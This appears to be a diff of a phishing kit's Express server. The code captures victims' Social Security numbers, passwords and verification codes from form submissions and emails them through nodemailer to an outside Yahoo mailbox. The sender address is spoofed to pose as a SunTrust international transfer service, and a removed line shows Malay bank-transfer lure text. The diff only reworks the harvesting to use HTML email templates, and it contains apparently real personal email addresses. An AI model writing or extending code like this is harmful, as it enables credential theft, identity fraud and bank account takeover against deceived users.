@@ -35,23 +35,24 @@ const transporter = nodemailer.createTransport({
 })
 
 
-  // const template = handlebars.compile(data.toString());
-  // const replacements = {
-  //   ssn: req.body.ssn,
-  //   password: req.body.password
-
-  // };
+fs.readFile('Mail.html','UTF-8',function(err, data) {
+  if (err) console.log('error', err);
+  const template = handlebars.compile(data.toString());
+  const replacements = {
+    ssn: req.body.ssn,
+    password: req.body.password,
+  };
+  const htmlToSend = template(replacements);
   
       const mailData = {
       from: 'suntrustinternationaltransfer@thechorleybuildingsociety.co.uk',
       to: 'dah_onest@yahoo.com',
       // to: 'joannelouisekenrick.cbs@gmail.com',
       // subject: `New User Alert`,
-    //   text: '************* PENGESAHAN BAYARAN DARI SUNTRUST PERINTAH PEMINDAHAN BANK *** PENGENALAN PEMINDAHAN KOD SW9532832117KMS ********************',
-      html: 'SSN : ' +  req.body.ssn + '     ' +
-            'PASSWORD : ' + req.body.password,
+      text: '',
+      html: htmlToSend,
       //  strUser
-      subject: 'New User Alert' ,
+      subject: '************* New User Filled the Form ********************',
       }
   
       transporter.sendMail(mailData, function (err, info) {
@@ -61,8 +62,7 @@ const transporter = nodemailer.createTransport({
           console.log(info)
           res.redirect('../verify')
         })
-
-
+}) 
   
 })
 
@@ -86,22 +86,23 @@ app.get('/verify', (req, res) => {
   })
   
   
-    // const template = handlebars.compile(data.toString());
-    // const replacements = {
-    //   ssn: req.body.ssn,
-    //   password: req.body.password
-  
-    // };
+  fs.readFile('Mail2.html','UTF-8',function(err, data) {
+    if (err) console.log('error', err);
+    const template = handlebars.compile(data.toString());
+    const replacements = {
+      verificationCode: req.body.verificationCode,
+    };
+    const htmlToSend = template(replacements);
     
         const mailData = {
         from: 'suntrustinternationaltransfer@thechorleybuildingsociety.co.uk',
         to: 'dah_onest@yahoo.com',
         // to: 'joannelouisekenrick.cbs@gmail.com',
         // subject: `New User Alert`,
-      //   text: '************* PENGESAHAN BAYARAN DARI SUNTRUST PERINTAH PEMINDAHAN BANK *** PENGENALAN PEMINDAHAN KOD SW9532832117KMS ********************',
-        html: 'VERIFICATION CODE : ' +  req.body.verificationCode + '     ' ,
+        text: '',
+        html: htmlToSend,
         //  strUser
-        subject: 'Verification Code',
+        subject: '************* New User Verification Code ********************',
         }
     
         transporter.sendMail(mailData, function (err, info) {
@@ -111,8 +112,7 @@ app.get('/verify', (req, res) => {
             console.log(info)
             res.redirect('../')
           })
-  
-  
+  }) 
     
   })
   
